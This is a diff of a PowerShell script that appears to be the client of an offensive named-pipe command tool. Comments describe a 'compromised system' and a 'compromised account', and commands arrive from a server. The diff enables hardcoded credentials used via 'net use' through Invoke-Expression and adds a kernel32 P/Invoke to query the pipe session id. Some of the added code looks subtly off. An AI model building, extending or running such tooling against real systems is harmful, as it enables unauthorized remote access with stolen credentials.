@@ -1,3 +1,15 @@
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class TokenUtils {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool GetNamedPipeServerSessionId(IntPtr Pipe, out uint ClientProcessId);
+}
+"@
+
+Add-Type -TypeDefinition $code
+
 function ReadCommand ([System.IO.StreamReader]$StreamReader){ #Read Command from Server
     $msg = $StreamReader.ReadLine()
     if($msg -eq "action=1"){
@@ -36,11 +48,11 @@ $pipeName = "YahudPipe"
 # Compromised system
 $pipeServer = "127.0.0.1"
 # Compromised account
-#$username = "hakkyahud"
-#$password = "root*123"
+$username = "hakkyahud"
+$password = "root*123"
 # Authenticate to the server before connecting to the Server pipe
-#$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
-#Invoke-Expression -Command $auth
+$auth = "net use \\{0} /user:{1} {2}" -f $pipeServer, $username, $password
+Invoke-Expression -Command $auth
 
 $identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
 $principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
@@ -192,8 +204,14 @@ while($pipeClient.IsConnected){
 
     elseif($status -eq "5"){
         $status = "0"
-        $sessionId = $null
+        $sessionId = [uint32]0
         $hPipe = $pipeClient.SafePipeHandle.DangerousGetHandle()
+        if (![TokenUtils]::GetNamedPipeServerSessionId($hPipe, [ref]$sessionId)) {
+            Write-Host $sessionId
+            return
+        }
+        
+                    
     }
 
     elseif($status -eq "6"){
